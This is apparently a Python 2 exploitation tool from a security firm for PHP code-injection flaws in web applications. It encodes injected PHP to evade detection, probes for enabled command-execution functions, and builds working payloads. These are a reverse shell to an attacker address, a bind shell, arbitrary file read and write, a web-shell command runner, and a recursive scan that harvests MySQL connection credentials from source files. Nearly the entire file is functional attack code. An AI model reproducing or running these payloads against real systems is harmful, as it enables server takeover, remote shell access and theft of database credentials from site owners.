#--
#
# Description:
#       This tool is used to exploit poorly sanitized user input in PHP 
#       web applications. 
#
#       Author: Level @ CORE Security Technologies, CORE SDI Inc.
#       Email: level@coresecurity.com
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#
#--

import random,urllib2,urllib,base64,sys
class xbuilder:
	def find_func(self,case):
		#thanks http://www.nutt.net/2007/04/08/list-functions-disabled-in-php/
		url,seed = self.return_bypass_detect(case,"""$disabled_functions+=+ini_get('disable_functions');+if+($disabled_functions!='')+{+$arr+=+explode(',',+$disabled_functions);+sort($arr);+for+($i=0;$i+<+count($arr);$i++)+{+echo+$arr[$i].',';+}+}""")
		func_list = ["system","passthru","exec","shell_exec","proc_open"]
		try:
			page = urllib2.urlopen(url)
			data = page.read()
		except:
			print "[*] could not grab data for function comparison"
			return 0
		for func in func_list:
			if func in data.split(str(seed))[1].replace(" ","").rstrip(",").split(","):
				print "[*] host does not allow php function: %s" % (func)
			else:
				return func
		return 0
		
	def return_bypass_detect(self,case,code):
		seed = random.random()
		bypass = "$a = array("
		payload = "<?php echo %s;%s echo %s; ?>" % (seed,code,seed)
		payload.replace(" ","+")
		for i in payload: bypass += "%s," % (ord(i))
		bypass=bypass[:-1]
		bypass+="); for ($i=0;$i<count($a);$i++) { $b[$i] = chr($a[$i]); } echo implode($b);"
		url = "%s?%s=%s" % (case.split("?")[0],case.split("?")[1].split("=")[0],urllib.quote(bypass))		
		return url,seed
		
	def return_bypass_exploit(self,case,code):
		seed = random.random()
		bypass = "$a = array("
		payload = "echo %s;%s echo %s;" % (seed,code,seed)
		payload.replace(" ","+")
		for i in payload: bypass += "%s," % (ord(i))
		bypass=bypass[:-1]
		bypass+="); for ($i=0;$i<count($a);$i++) { $b[$i] = chr($a[$i]); } eval(implode($b));"
		url = "%s?%s=%s" % (case.split("?")[0],case.split("?")[1].split("=")[0],urllib.quote(bypass))
		return url,seed	
		
	def return_payload(self,case,func,**kwargs):
		for key in kwargs:
			if (key == 'hook'):
				return """function find_connect($file) { $file_handle = fopen($file, "r"); while (!feof($file_handle)) { $line = fgets($file_handle); if (strpos($line,'mysql_connect') !== FALSE) { return $line; } } fclose($file_handle); return 0; } $it = new RecursiveDirectoryIterator("."); foreach(new RecursiveIteratorIterator($it) as $file) { $string = find_connect($file); if ($string !== 0) { print $string; } }"""
			if (key == 'bind'):
				address = kwargs['address']
				port = kwargs['port']
				return """set_time_limit(0); $sockfd = socket_create(AF_INET, SOCK_STREAM, SOL_TCP); socket_bind($sockfd, '%s', %i); socket_listen($sockfd,15); $client = socket_accept($sockfd); while(1) { socket_write($client,'\n$ '); $cmd = socket_read($client,4096); if($cmd == FALSE) { break; } socket_write($client , %s($cmd)); } socket_shutdown($client, 2); socket_close($sockfd);""" % (address,int(port),func)
			if (key == 'reverse'):
				address = kwargs['address']
				port = kwargs['port']
				return """set_time_limit(0); $sockfd = socket_create(AF_INET, SOCK_STREAM, SOL_TCP); socket_connect($sockfd,'%s',%i); while(1) { socket_write($sockfd,'\n$ '); $cmd = socket_read($sockfd,4096); if($cmd == FALSE) { break; } socket_write($sockfd , %s($cmd)); } socket_shutdown($sockfd, 2); socket_close($sockfd);""" % (address,int(port),func)
			if (key == 'fs_read'):
				return """$handle = @fopen('%s', "r"); if ($handle) { while (!feof($handle)) { $buffer = fgetss($handle,4096); echo $buffer; } fclose($handle); }""" % (kwargs[key])
			if (key == 'fs_write'):
				loc = kwargs['location']
				fp = open(kwargs[key],'rb')
				data = fp.read()
				fp.close()
				return """$data = base64_decode('%s'); $f = fopen('%s','wb'); fwrite($f,$data,strlen($data)); fclose($f);""" % (base64.b64encode(data),loc)
			if (key == 'web_shell'):
				return "%s('%s');" % (func,kwargs[key])				
		return 0
		
	def inject(self,url,seed):
		try:
			page = urllib2.urlopen(url)
			data = page.read()
			return data.split(str(seed))
		except:
			print '[*] read exception during injection'
			sys.exit()
		return	
			
